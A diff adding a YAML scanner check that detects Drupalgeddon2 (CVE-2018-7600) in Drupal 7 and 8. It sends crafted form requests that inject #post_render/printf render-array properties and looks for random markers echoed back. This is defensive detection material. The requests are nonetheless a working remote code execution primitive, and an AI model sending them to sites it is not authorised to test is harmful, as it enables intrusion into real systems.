@@ -1,0 +1,48 @@
+detail:
+  links:
+  - https://github.com/dreadlocked/Drupalgeddon2
+  - https://paper.seebug.org/567/
+expression: drupal80() || drupal70() && drupal71()
+manual: true
+name: poc-yaml-drupal-cve-2018-7600-rce
+rules:
+  drupal70:
+    expression: response.status == 200
+    output:
+      build_id: search["build_id"]
+      search: '"name=\"form_build_id\"\\s+value=\"(?P<build_id>.+?)\"".bsubmatch(response.body)'
+    request:
+      body: 'form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
+
+        '
+      cache: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]={{r1}}%25%25{{r2}}
+  drupal71:
+    expression: response.body.bcontains(bytes(r1 + "%" + r2))
+    request:
+      body: 'form_build_id={{build_id}}
+
+        '
+      cache: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /?q=file%2Fajax%2Fname%2F%23value%2F{{build_id}}
+  drupal80:
+    expression: response.body.bcontains(bytes(r1 + "%" + r2))
+    request:
+      body: 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]={{r1}}%25%25{{r2}}
+
+        '
+      cache: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
+transport: http
